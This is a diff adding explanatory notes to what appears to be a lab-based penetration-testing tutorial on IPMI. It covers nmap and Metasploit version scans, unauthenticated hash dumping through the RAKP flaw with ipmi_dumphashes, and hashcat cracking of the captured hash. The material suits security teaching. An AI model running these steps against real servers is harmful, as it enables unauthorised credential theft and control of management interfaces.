@@ -99,6 +99,7 @@ Systems using IPMI are called **BMCs**. They are typically implemented as **embe
 ```bash
 sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
 ```
+> `-sU` is required for UDP scanning. The `ipmi-version` NSE script queries UDP port 623 to identify the IPMI version and supported authentication methods. Replace `ilo.inlanfreight.local` with the target hostname or IP.
 
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
@@ -128,6 +129,7 @@ msf6 > use auxiliary/scanner/ipmi/ipmi_version
 msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
 msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 ```
+> The Metasploit `ipmi_version` module discovers IPMI services and reports version and authentication details. Set `RHOSTS` to your target IP and run. Equivalent to the Nmap scan but integrates into the Metasploit workflow.
 
 ```
 [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
@@ -170,6 +172,7 @@ msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
 ```
+> The `ipmi_dumphashes` module exploits the RAKP flaw in IPMI 2.0 to retrieve password hashes without authentication. Set `RHOSTS`, optionally set `OUTPUT_HASHCAT_FILE` to save hashes for cracking, then `run`.
 
 ```
 Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
@@ -189,6 +192,7 @@ Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
 ```bash
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 ```
+> Executes the hash dump. If a hash is immediately cracked (like `ADMIN:ADMIN` in the example), you see the plaintext password. Otherwise, save the hash and crack it with hashcat `-m 7300`.
 
 ```
 [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
@@ -212,6 +216,7 @@ hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
 # HP iLO default password mask attack (8-char: uppercase + numbers)
 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```
+> `-m 7300` is the hashcat mode for IPMI2 RAKP HMAC-SHA1 hashes. The dictionary attack tries rockyou against the captured hash. The mask attack (`-a 3`) brute-forces all 8-character combinations of uppercase letters and digits — matching the HP iLO factory default password format. Save hashes from the Metasploit module to `ipmi.txt` first.
 
 | Parameter | Description |
 |-----------|-------------|
